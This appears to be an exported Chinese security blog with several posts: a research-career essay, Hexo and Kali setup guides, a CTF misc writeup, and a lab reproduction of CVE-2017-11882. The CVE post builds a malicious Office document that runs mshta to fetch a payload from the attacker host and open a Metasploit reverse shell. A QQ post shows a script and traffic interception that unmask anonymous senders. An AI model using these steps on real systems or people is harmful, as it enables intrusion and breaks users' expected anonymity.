工具与方法论沉淀虽说代码审计是项必备技能，但终究是项体力活。有些漏洞（比如逻辑漏洞）可能就需要人工审计，但也有不少漏洞是可以自动化Fuzzing，一些能自动化或半自动化实现的，尽量写程序自动化。因为，纯人工审计终究熬不过年纪，熬不过团队人员的离散变迁，熬不过互联网的快速发展……比如，2012年刚开始写《漏洞战争》时，单身一人，从早上8点多起床吃饭，然后开始调代码、看代码，一直奋战到晚上12点，身体无压力。近7年过去了，现在要是这么折腾，身体就要散架了……比如，团队里的人分工做不同领域的代码审计，若无工具和方法论沉淀，那么有人走的话，此人对应的领域可能就无法持续产出；若有新人加入，代码审计的技能又不好传承，很多又得重头来。所以，一直觉得，好的团队应该是，即使人员离散变迁，依然能够独立运作、持续产出。比如，Linux内核在2018年净增87万行代码，很多类似复杂庞大的项目，看代码有时看都看不过来，一般都是针对性地挑模块作代码审计。再比如，Fuzzer开发里面就有很多共用功能是可以直接做成框架沉淀下来，文件变异、崩溃监控、样本去重精简等等，很多时候有个新的攻击面需要测试，就可以直接在框架的基础上写fuzzer，将会高效很多。下文提到的一个IE漏洞挖掘案例就是基于这思路挖到的。我曾经想开发两个漏洞挖掘系统，一个二进制，一个Web，名字都想好了，合称”冰弓玄箭“，就是英雄联盟中寒冰射手的那套装备，但一直都没什么业余时间去开发，仅写了个界面，希望2019年有机会能够完成：“冰弓”的Logo直接用的是“破甲弓”，感觉是不是很酷…… 再说说方法论，这词虽有点虚，但其实本质上就是一种技术方法的总结而已。比如，渗透测试的时候，总有些人每次都能搞到RCE，无论啥网站，完全摆脱“随机挖洞”的命运。多数情况下，他们都会有一套自己测试方法，或者将一些经验转换成工具，测试时就拿自己的工具和以往总结的方法论开搞。比如，STRIDE威胁建模本身就是一套方法论，一套简单的风险助记符，当然我这里不是说安全研究要用它，只是举个方法论的例子而已，它也没有那么万能。写这么多，总结起来就一句话：多总结，多沉淀！ 漏洞研究风向标：安全公告如果大家有关注四大厂商（Google、Microsoft、Apple、Adobe）的安全公告的话，会发现有段时间会出现很多类似漏洞的公告，因为每次出现一个新的攻击面之后，一帮研究人员就蜂捅而上狂刷一波。这种情况一向是先下手为强，而上文提到的工具和方法论就更显得尤为重要了，否则最后都只能捡剩的。比如本周 Microsoft 安全公告出来后，我仔细分析了下，然后下班回家写了个Fuzzer，挂着跑了一天，出来个Crash，再用几分钟成功构造出PoC，实现IE浏览器的远程代码执行，可见也是个品相极佳的神洞：但不幸的是，我打了1月的补丁后，发现修复了，成功“撞洞”，真的是欲哭无泪……但至少证明，通过安全公告寻找新的攻击面，然后挖掘一些类似漏洞，一直是一种高效的漏洞研究方式。 老一辈研究者都去哪儿了？最近腾讯AILab张潼离职的事传得很火，还有之前各大厂聘请的AI科学家陆续辞职，回归学术界，很多人因此唱起科学家之于科技公司的无用论，主要有以下几点原因： 研究成果无法落地为产品：做安全研究也是如此，很多事情是无法落地的，圈内很多研究团队都是拿漏洞来打比赛赚影响力，真正能实现为公司营利的（打比赛赚奖金的忽略不计，因为那些都不够给研究者们的工资），我只知道有1个研究团队/实验室今年营利了。 长期无产出，KPI压力大：研究了很长时间，最后仍一无所获，那KPI咋办、PPT怎么写、晋级怎么答辩。安全行业有句老话来形容安全研究工作，叫“三年不开锅，开锅吃三年”，但多数个人和企业都等不到三年。之前同事说王小云为何能破解出 MD5，是因为她在学校里很长时间没搞出东西的时候，领导没找她麻烦，没有KPI 压力，以致能够长期专注于此。具体原因我不确定，但学术界自然是没有企业有这般KPI压力。 业务数据不共享：业务部门的产品数据基本不太可能共享给实验室作研究的，一般都是实验室以SDK的形式提供给业务用，数据由业务自主控制。这种情况对于安全研究的影响相对较少一些。 头两点是多数安全研究者的困境，也跟圈内同行讨论过，下面聊聊这帮老一代“知青”最后都去哪儿了？这里我主要总结一些圈内人的应对方法（其实多数都是转型），具体不作点评，总结为主，也欢迎私信讨论（新注册的公众号已不允许留言）。 坚持研究：这帮人主要还是那些研究能力较强的，且有一定研究成果的人，围观下各大实验室就知道个大概了，不多说； 转型安全产品开发与运营：有产品就能解决落地问题，帮助企业解决实际问题，有不少人走这条道，去做威胁情报系统、漏洞扫描器、WAF、云安全产品等等； 转型业务安全：跟研究工作差异较大，因为业务安全的主要问题很多时候并非漏洞，而是跟业务产品相关的黑灰产对抗等等； 自由研究者：国外很多此类研究者，靠拿漏洞赏金过活，俗称“赏金猎人”，国内相对少一些，也有一些国内自由研究者后来又进企业做研究的，这里讲的几种转型都可以来回转换，有些人就干过。 创业：这里包括安全行业内的创业，也包括那些开淘宝店、奶茶店、服装生意、卖水果的…… 个人终究干不过团队有时想搞的研究太多了，但发现一个人根本搞不过来，需要多人协作才可能完成。但需要多人在研究领域上有交集，否则拉在一块也是各搞各的。前篇第7点讲到“进入研究者团队或社区，互相学习”，也是一大影响因素，互相学习也是一种提高效率和产出的方式。算了，不多说了！结语这次真的结束了，没有续篇了。思考了很多，总结了很多，有些也是写了删，删了写。安全研究领域一直也没人写过这些，出来唠叨几句，也欢迎大家私信讨论。最后奉一首酒桌上的《苦行僧》结束本话题，听过这首歌很多个版本，包括原唱，但终究还是觉得视频里这位老哥唱得更具江湖气、更具情感、更具感染力……旁边一老哥听着听着都偷偷抹泪了！之所以点这首歌，是因为：每一个研究者都是独立自行的苦行僧！]]></content>
      <categories>
        <category>心得体会</category>
      </categories>
      <tags>
        <tag>心得体会</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GitHub+Hexo 搭建个人博客]]></title>
    <url>%2F2019%2F01%2F15%2F%E4%BD%BF%E7%94%A8Github%2BHexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[随着互联网时代的到来，国内外涌现出越来越多的社交网站让用户之间分享信息变得更加便捷，那么你是否也曾想过拥有一个属于自己的网站，写文章记录生活？如果你曾经或现在拥有这样的想法，就请跟随这篇文章，充分发挥你的动手能力，快速搭建属于你自己的个人博客网站，记录下生活中的美好。 搭建步骤 1.GitHub创建个人仓库 2.安装Git 3.安装Node.js 4.安装Hexo 5.推送网站 6.更换主题 7.发布文章 Hexo简介Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 Github简介GitHub 是一个面向开源及私有软件项目的托管平台，因为只支持 Git 作为唯一的版本库格式进行托管，故名 GitHub。GitHub 于 2008 年 4 月 10 日正式上线，除了 Git 代码仓库托管及基本的 Web 管理界面以外，还提供了订阅、讨论组、文本渲染、在线文件编辑器、协作图谱（报表）、代码片段分享（Gist）等功能。目前，其注册用户已经超过百万，托管版本数量也是非常之多，其中不乏知名开源项目 Ruby on Rails、jQuery 等。 搭建过程Github创建个人仓库首先我们需要注册一个Github账号，注册成功后，使用刚才注册的账号密码进行登陆。注册地址：https://github.com/join?source=header-home点击GitHub中的New创建新仓库，仓库名应该为：用户名.github.io这个用户名使用你的GitHub帐号名称代替，这是固定写法，比如我的仓库名为：1sniper.github.io 安装GitGit是开源的分布式版本控制系统，用于敏捷高效地处理项目。Git下载地址:https://git-scm.com/downloads Windows 用户由于众所周知的原因，从上面的链接下载git for windows最好挂上一个代理，否则下载速度十分缓慢。也可以参考这个页面，收录了存储于百度云的下载地址。 安装完成后，在命令行里输入git测试是否安装成功，若安装失败，参看其他详细的Git安装教程。安装成功后，将你的Git与GitHub帐号绑定，在任意位置鼠标右击打开Git Bash，或者在菜单里搜索Git Bash，使用如下代码设置user.name和user.email配置信息：12git config --global user.name &quot;你的GitHub用户名&quot;git config --global user.email &quot;你的GitHub注册邮箱&quot; 如下图所示：然后利用以下命令生成ssh密钥文件： 1ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot; 如下图所示：然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制打开GitHub_Settings_keys 页面，新建new SSH KeyTitle为标题，任意填即可，将刚刚复制的id_rsa.pub内容粘贴进去，最后点击Add SSH key。添加完成后，页面如下：另外，当我们添加ssh密钥成功后，会收到一封来自Github的邮件，或者我们可以在Git页面检测是否设置成功，命令如下：1ssh git@github.com 如图所示：如上则说明成功。这里之所以设置GitHub密钥原因是，通过非对称加密的公钥与私钥来完成加密，公钥放置在GitHub上，私钥放置在自己的电脑里。GitHub要求每次推送代码都是合法用户，所以每次推送都需要输入账号密码验证推送用户是否是合法用户，为了省去每次输入密码的步骤，采用了ssh，当你推送的时候，git就会匹配你的私钥跟GitHub上面的公钥是否是配对的，若是匹配就认为你是合法用户，则允许推送。这样可以保证每次的推送都是正确合法的。 安装Node.js简单的说 Node.js 就是运行在服务端的 JavaScript。Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。Node.js下载地址：https://nodejs.org/en/download/下载完成后进行安装，注意安装Node.js会包含环境变量及npm的安装，安装后，检测Node.js是否安装成功，在命令行中输入1node -v 检测npm是否安装成功，在命令行中输入1npm -v 如图所示： 安装HexoHexo是我们的个人博客网站的框架， 需要自己在电脑常里创建一个文件夹，可以命名为Blog，Hexo框架与以后你自己发布的网页都在这个文件夹中。创建好后，进入文件夹，按住shift键，鼠标右键点击”在此处打开Powershell窗口”，使用npm命令安装Hexo，输入：1npm install -g hexo-cli 安装时间较长耐心等待安装完成后，在刚才创建的文件夹内点击鼠标右键，选择”Git Bash Here”，初始化我们的博客，输入命令：1hexo init 如图所示：然后按顺序输入以下命令，在本地部署博客，用于检查网站雏形：12hexo ghexo s 如图所示：完成后，打开浏览器输入地址：localhost:4000可以看到我们的网站雏形如下：附：Hexo常用命令简介1234567891011121314npm install hexo -g #安装Hexonpm update hexo -g #升级 hexo init #初始化博客hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章hexo g == hexo generate #生成hexo s == hexo server #启动服务预览hexo d == hexo deploy #部署hexo server #Hexo会监视文件变动并自动更新，无须重启服务器hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存，若是网页正常情况下可以忽略 推送网站上面介绍的只是用于本地预览，接下来要做的是推送网站，也就是发布网站，让我们的网站可以被更多的人访问。在进行部署之前，需要解释一个概念，在blog根目录里的_config.yml文件称为站点配置文件，如下图：进入根目录里的themes文件夹，里面也有个_config.yml文件，这个称为主题配置文件，如下图：下一步将我们的Hexo与GitHub关联起来，打开站点的配置文件_config.yml，将最后的代码修改为：1234deploy: type: gitrepo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .gitbranch: master 注意：在冒号之后有一个空格（英文格式）参考如下：保存站点配置文件。其实就是给hexo d 这个命令做相应的配置，让hexo知道你要把blog部署在哪个位置，很显然，我们部署在我们GitHub的仓库里。最后安装Git部署插件，在网站根目录文件夹下按住shift点击鼠标右键选择”在此处打开Powershell窗口”，输入命令：1npm install hexo-deployer-git --save 如下图所示：然后我们在网站根目录文件夹下按住shift点击鼠标右键选择”Git Bash Here”，依次输入三条命令：123hexo clean hexo g hexo d 如图所示：我们第一次部署的时候会要求输入Github的账号密码，按要求输入即可，如图所示：完成后，打开浏览器，在地址栏输入你的放置个人网站的仓库路径，即 http://xxxx.github.io 比如我的xxxx就是我的GitHub用户名，你就会发现你的博客已经上线了，可以在网络上进行访问了。 更换主题如果你不喜欢Hexo的默认主题，可以在网络上下载其他主题进行更换主题下载地址：https://hexo.io/themes/将自己喜欢的主题下载之后进行解压，注意因为大多数主题在Github上下载，我们需要将文件名更改，例如hexo-theme-next-master，需要更改为next，然后放在网站根目录下的theme文件夹下，最后修改网站的配置文件中theme这一行为你的主题名称，例如:然后我们在网站根目录文件夹下按住shift点击鼠标右键选择”Git Bash Here”，依次执行以下命令进行部署：12hexo ghexo d 我们可以看到博客的主题已经更改了： 发布文章我们可以用markdown语法编写完文章后，将md文件放置于网站根目录的\source_posts下，然后重新进行部署，或者可以利用以下命令：1hexo new &quot;博客名字&quot; 直接在\source_posts下生成md文件，然后进行编辑，重新部署。这样一篇章新的文章就发表了。如图所示： 总结怎么样，到这里是不是你的个人博客也搭建完成了呢？是不是成就感满满呢？允许你偷偷激动一下…哈哈哈]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-11182漏洞复现及利用]]></title>
    <url>%2F2018%2F12%2F10%2FCVE-2017-11882%2F</url>
    <content type="text"><![CDATA[工程实践题目： 渗透方向：实验班要求1、利用已有的漏洞，搭建内网实验环境（WEB漏洞或系统漏洞以近两年内的CVE编号为准，每人一个，先报先得，具体由学习委员负责协调），利用工具进行内网渗透攻击。2、要求必须用到端口转发方面的知识。3、上交调试好的环境（VMware格式）、完整的渗透测试报告（包括环详细的境搭建文档、脚本分析文档、渗透攻击过程）、和教学实习报告。 漏洞影响版本Office 365 Microsoft Office 2000 Microsoft Office 2003 Microsoft Office 2007 Service Pack 3 Microsoft Office 2010 Service Pack 2 Microsoft Office 2013 Service Pack 1 Microsoft Office 2016 实验环境攻击靶机：kali 2.0 IP：192.168.79.129 Metasploit 目标靶机：Windows7 IP: 192.168.79.128 Microsoft Office 2013 需要准备的文件[CVE-2017-11882的POC](https://github.com/Ridter/CVE-2017-11882/) [PS_shell.rb](https://pan.baidu.com/s/1jHWecV8) 密码: rtnp [Office 2013]( https://pan.baidu.com/s/1dE5jT53) 密码: qb6g 漏洞验证使用POC文件执行以下命令生成测试doc文件: 1python Command43b_CVE-2017-11882.py -c “cmd.exe /c calc.exe” -o test.doc 将生成的doc文件发送至目标主机直接打开,弹出计算器即漏洞验证成功，可进一步利用 漏洞利用配合kali2.0 meterpreter 接收目标靶机反弹的shell 1.下载PS_shell.rb，将该文件放在kali 的/usr/share/metasploit-framework/modules/exploits/windows/shells/目录下，输入msfconsole启动metasploit,然后执行reload_all重新加载一下所有模块。 2、使用我们刚刚上传的PS_shell.rb 命令如下： 1234use exploit/windows/shells/PS_shellset payload windows/meterpreter/reverse_tcpset lhost 192.168.79.129set uripath abc 3.开启监听 命令： 1exploit 4、使用POC生成新的测试doc文件，在目标靶机中打开生成的doc文件，目标靶机正常上线。1python Command109b_CVE-2017-11882.py -c “mshta http://192.168.79.129:8080/abc“ -o test2.doc 5.输入session可以查看到接收到的shell 6.选择sessions 1并获取目标靶机信息 漏洞修复 1、微软已经对此漏洞做出了修复。 (1)下载https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882 更新补丁进行修补 (2)开启Windows Update功能，定期对系统进行自动更新 2、在注册表中禁用该漏洞模块： 按下Win+R组合键，打开cmd.exe输入以下两条命令： 123reg add “HKLM\SOFTWARE\Microsoft\Office\Common\COM Compatibility&#123;0002CE02-0000-0000-C000-000000000046&#125; ” /v “Compatibility Flags” /t REG_DWORD /d 0x400reg add “HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\Common\COM Compatibility&#123;0002CE02-0000-0000-C000-000000000046&#125; ” /v “Compatibility Flags” /t REG_DWORD /d 0x400 相关链接：http://zksmile.me/2017/11/28/CVE-2017-11882/ http://www.myh0st.cn/index.php/archives/329/END]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QQ坦白说破解方法汇总]]></title>
    <url>%2F2018%2F11%2F08%2Fqqtanbaishuo%2F</url>
    <content type="text"><![CDATA[近两天QQ新功能的坦白说开始席卷朋友圈，一个醒目的小窗就这样明晃晃出现在QQ对话列表“有人对你说：……”下面我们就来整理一下怎么看到是谁给你发送的坦白说呢？ 方法一：==此方法仅限于iOS用户== 当有朋友给你发送坦白说时，你可以在搜索框里面搜索对方发送的内容，然后对方的备注信息就会出现啦！ 方法二：在对方给你发送坦白说时，若他给你发送了图片，可以将图片收藏，然后在我的收藏里面就能看到是谁发送的了。（此处无图） 方法三：==此方法本人只在iOS设备进行尝试过，并没有在安卓进行实验。== 在对方发送坦白说后，疯狂点击聊天气泡，然后就会出现以下界面 这样我们就可以看到对方的头像了。只不过这个气泡很难点开，要尝试很多次。 方法四：这个操作方法很简单，安卓或者iOS系统都适用。 首先在手机QQ打开这个网址。打开后会看到一段代码，将代码内容全部复制。然后进入这个网址。将代码粘贴到输入框中，就会显示出对方的qq号码了。 ==注==：查询网页由知乎网友@JackZ 制作，谢谢这位兄dei。 原理： 打开的第一个网址是获取坦白说的json数据，第二个就是进行解密了。json数据代码中fromNick是指对方的昵称，fromEncodeUin是对方的QQ号码进行加密后的密文，topicName是指对方给你发送的内容。我们只需要知道密文就可以了。 此处的加密是三位循环查表法，将密文按照下表对照即可得到对方的QQ。 方法5：与方法四原理相同，只是写了个python脚本。 12345678910# -*- coding: UTF-8 -*-qq = &apos;密文&apos;en = (&apos;oe&apos;,&apos;oK&apos;,&apos;ow&apos;,&apos;oi&apos;,&apos;7e&apos;,&apos;7K&apos;,&apos;7w&apos;,&apos;7i&apos;,&apos;Ne&apos;,&apos;NK&apos;, &apos;on&apos;,&apos;_&apos;,&apos;_&apos;,&apos;Nn&apos;,&apos;7n&apos;,&apos;7v&apos;,&apos;_&apos;,&apos;7z&apos;,&apos;_&apos;,&apos;_&apos;, &apos;n&apos;,&apos;b&apos;,&apos;-&apos;,&apos;o&apos;,&apos;v&apos;,&apos;a&apos;,&apos;C&apos;,&apos;S&apos;,&apos;c&apos;,&apos;E&apos;, &apos;z&apos;,&apos;d&apos;,&apos;A&apos;,&apos;i&apos;,&apos;P&apos;,&apos;k&apos;,&apos;s&apos;,&apos;I&apos;,&apos;F&apos;,&apos;q&apos;)qq = qq.replace(&apos;4&apos;,&apos;a&apos;).replace(&apos;6&apos;,&apos;b&apos;).replace(&apos;5&apos;,&apos;d&apos;)for i in range(len(en)) : qq = qq.replace(en[i], str(i%10), 10)print (qq) 只需要将密文填写进去就可以了。 ==注：==python在线编译网站 趁着TX爸爸还没有修复这些，尽情的蹂躏它吧。如果有其他破解方法，欢迎投稿哦！ 联系邮箱：h4ckert1@gmail.com 2018-04-01 18：40腾讯已经紧急修复，上述方法四、方法五获取json数据的地址已经不可用。腾讯的 程序员也是会玩，但是我总觉得这个程序员注定单身。。。 俗话说的好：“上有政策下有对策”。 下面我们来说一下“对策”。 方法六 应用抓包分析工具准备： Fiddler是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据（指cookie,html,js,css等文件，这些都可以让你胡乱修改的意思）。 Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露http通讯还提供了一个用户友好的格式 Fiddler4下载 安装配置：1.Fiddler配置 打开软件，选择Tools–&gt;Options. Https设置如图： Connections设置如图：记住端口号，默认为8888。 配置完成后重启软件。 2.安卓手机端配置保证手机与电脑再同一个局域网中。如图获取ip地址： 设置wifi代理： 然后浏览器访问192.168.1.103:8888.就是你的IP地址和端口号。如下图所示：点击FiddlerRoot certificate,安装证书： 至此，安卓手机端所有配置完成。 3.iOS手机配置 保证手机与电脑再同一个局域网中。如图获取ip地址： 设置wifi代理：用手机safari浏览器访问192.168.1.103:8888.就是你的IP地址和端口号。如下图所示：点击FiddlerRoot certificate–&gt;允许，安装描述文件： 然后打开设置-&gt;通用-&gt;关于本机-&gt;证书信任设置，把刚才安装的描述文件启用完全信任，否则可能失败。 至此，iOS手机端所有配置完成。 进行抓包。 首先清空数据。 在手机端打开坦白说，进入我收到的坦白说。我们可以看到抓取的数据包有一大堆。找前面的类型是json的数据包。应该一共有两个，有一个是好友收到的坦白说，还有一个是你自己收到的坦白说。如图是我抓到的json数据包：，然后就可以参考方法四和方法五进行解密了。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[巅峰极客CTF misc writeup]]></title>
    <url>%2F2018%2F10%2F01%2Ftopmisc%2F</url>
    <content type="text"><![CDATA[“巅峰极客”CTF misc 1.flows拿到一个pcap包，用wireshark打开，发现是USB协议，尝试在kali下使用tshark提取，提取失败，发现异常。回到wireshark分析数据。在其中一个数据包中发现了tip把字节分组以原始数据保存出来，得到两个tips然后将数据包排序，把最大的两个数据导出为1.pcap和2.pcap，然后在kali下利用tshark将leftover capture data里的内容单独提取出来，命令如下： 12tshark -r 1.pcap -T fields -e usb.capdata &gt; 1.txttshark -r 2.pcap -T fields -e usb.capdata &gt; 2.txt 参考：https://www.anquanke.com/post/id/85218 直接脚本将其中一个txt跑出来为： flag[u5b-key，Tips里提醒了shirt问题，则为： flag{u5b_key 附上脚本:(网站中给出的脚本有错误，定义mappings时\将后面的内容转义了，需要将”\”转义一下”) 1234567891011121314151617mappings = &#123;0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;&#125;nums = []keys = open(&apos;1.txt&apos;)for line in keys: if line[0]!=&apos;0&apos; or line[1]!=&apos;0&apos; or line[3]!=&apos;0&apos; or line[4]!=&apos;0&apos; or line[9]!=&apos;0&apos; or line[10]!=&apos;0&apos; or line[12]!=&apos;0&apos; or line[13]!=&apos;0&apos; or line[15]!=&apos;0&apos; or line[16]!=&apos;0&apos; or line[18]!=&apos;0&apos; or line[19]!=&apos;0&apos; or line[21]!=&apos;0&apos; or line[22]!=&apos;0&apos;: continue nums.append(int(line[6:8],16))keys.close()output = &quot;&quot;for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += &apos;[unknown]&apos;print &apos;output :n&apos; + output 第二个数据包为鼠标的数据，根据tips，只需要看第一个字节，将后面的字节删除，只保留第一字节，推测00为未点击，01为点击左键，02为点击右键。将txt整理好，去掉没有点击的00； 保留01和02，即左键与右键； 猜测应为左键为0，右键为1，所以将01替换为0,02替换为1，生成二进制字符串。将两段flag拼接即可得到完整flag。 tips：第一个键盘数据包的脚本存在问题，根据tips应告示如果第一个字节为0x20就按下shift，但是脚本中无法识别第一个字节为0x20的字符，直接被忽略了，但是这里我们可以根据猜测货值直接打开txt文件手工判断也能得到flag。 2.warmup附上题目地址： https://pan.baidu.com/s/1Kww5O2XPE5DwL1dcvYA2XQ 密码: wfkb 注意看这张图一会会考脑洞。 拿到题目打开后是一张bmp格式的图片，由此想到LSB加密。LSB也就是最低有效位 (Least Significant Bit)。原理就是图片中的像数一般是由三种颜色组成，即三原色，由这三种原色可以组成其他各种颜色，例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像数中的最低的1bit，在人眼看来是看不出来区别的，也把信息隐藏起来了。譬如我们想把’A’隐藏进来的话，如下图，就可以把A转成16进制的0×61再转成二进制的01100001，再修改为红色通道的最低位为这些二进制串。 既然是LSB加密，上神器stegsolve。下载地址： https://pan.baidu.com/s/1l0k8wZeJ9ORvLMKgmafWHA 密码: ckbb 打开之后，使用Stegsolve——Analyse——Frame Browser这个可以浏览三个颜色通道中的每一位，并没有发现什么有价值的信息。 之后，使用Stegsolve——Analyse——Data Extract分别提取三个颜色通道中的最低位，发现是brainfuck和Ook，在线解密：https://www.splitbrain.org/services/ook将三段字符串拼接得到完整flag。 3.Loli图片下载下来，根据题目hint，想到使用0xFF异或整个文件（这我也不知道怎么想到的。。看了wp才知道这样做），脚本如下： 1234567891011#!/usr/bin/env python# coding=utf-8def xor(): with open(&apos;./1.png&apos;, &apos;rb&apos;) as f, open(&apos;xor.png&apos;, &apos;wb&apos;) as wf: for each in f.read(): wf.write(chr(ord(each) ^ 0xff))if __name__ == &apos;__main__&apos;: xor() 得到新的png文件 使用二进制编辑器观察尾部，看到提示“black and white”，以及“IEND”标识，这是png的文件尾部，暗示该文件中隐藏了一个png文件。 使用 foremost 命令直接提取或者直接手扣一个png 观察png文件，可以看到色块分为11列，每列隔行的色块永远是黑色，这说明应该横向读取图片，而列中的横长条由8个小色块组成，显然其代表的是一个字节的数据。 按上述思路使用脚本提取该信息： 123456789101112131415161718192021222324252627import matplotlib.image as mpimgres_str = []res = []def readpng(): png = mpimg.imread(&apos;./out.png&apos;) yy, xx, depth = png.shape for y in range(yy): if y % 2 == 0: for x in range(1, xx - 1, 9): _str = &quot;0b&quot; + str(int(png[y][x][0])) + str(int(png[y][x + 1][0])) + str(int(png[y][x + 2][0])) + str(int(png[y][x + 3][0])) + str(int(png[y][x + 4][0])) + str(int(png[y][x + 5][0])) + str(int(png[y][x + 6][0])) + str(int(png[y][x + 7][0])) res_str.append(_str) res.append(bin2hex(_str)) print res_str with open(&apos;res.bin&apos;, &apos;wb&apos;) as f: for each in res: f.write(chr(each))def bin2hex(_bin=&quot;0b101&quot;): return int(_bin, 2) ^ 0xFFif __name__ == &apos;__main__&apos;: readpng() 得到二进制文件，只用cat命令即可获取flag 总结CTF脑洞是真的重要，有些东西根本想不到或者不知道怎么想到的。另外，这次misc题目让我更加了解了stegsolve的用法，以前一般都是一起整体提取三个颜色的最低位，没想到还可以分别提取。还有就是了解了USB数据包的方法以及一般做题步骤。还是要多积累。加油！！！]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装教程]]></title>
    <url>%2F2018%2F08%2F08%2Fkali%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[史上最详细的kali安装教程没有之一 首先在vm里面新建虚拟机，直接选择典型，然后下一步。 然后到了这一步，选择中间的安装程序光盘镜像文件，然后去文件里面找你自己下载的镜像，这时候可能系统会出现无法检测此光盘镜像中的操作系统，没关系，自己选一下咯。按照下图选择就好。 然后就下一步给虚拟机命名选择安装位置，这个应该不用多讲吧。。。 继续下一步，给虚拟机选择磁盘大小。意思就是说，你虚拟机里面的硬盘要多少，就像Windows里面CDE盘都是多大，一个意思，我这里定义50G，根据个人需要可以改变。 继续下一步，如图我们可以更改虚拟机硬件。点击自定义硬件。 只需要改变内存和处理器就可以了。可以根据自己电脑的配置进行调整。如图所示。 点击关闭，然后开启此虚拟机。 接下来的操作完全按照下图就可以了。。。 选择Graphical install 语言选择中文简体 选择您的区域，中国 选择键盘映射，汉语.接着是一系列自动操作 到这一步选择主机名，自定义就行了 域名直接跳过，回车。然后又是一系列自动操作 设置密码，和Windows一样，就是开机密码，一定要记住，不然会很麻烦。然后接下来全部按照下图操作。 接下来系统将会自动安装。 再然后就是漫长的等待。然后会问你是否要选择网络镜像，如果你的网络很好可以选择是，这里呢我选择的否。 再再然后他会问你这个，一定要选择是！！！ 下一步如图所示选择 然后等待系统安装完毕重启就行了。 大功告成！！！]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
</search>
